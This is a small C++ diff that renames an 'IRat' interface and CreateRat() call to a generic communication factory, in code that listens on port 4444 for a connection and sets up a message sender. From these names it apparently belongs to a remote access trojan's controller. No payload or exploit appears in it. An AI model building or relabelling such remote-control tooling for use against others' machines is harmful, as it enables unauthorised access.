@@ -2,11 +2,11 @@
 
 #include "IConnectionListener.h"
 #include "Trace.h"
-#include "IRat.h"
+#include "ICommunicationFactory.h"
 #include "MessageType.h"
 
 int main() {
-	const auto rat = CreateRat();
+	const auto rat = CreateFactory();
 	const auto server = rat->CreateWinSockConnectionListener(4444);
 	const auto connection = server->WaitForConnection();
 	static const auto sender = rat->CreateMessageSender(connection.get());
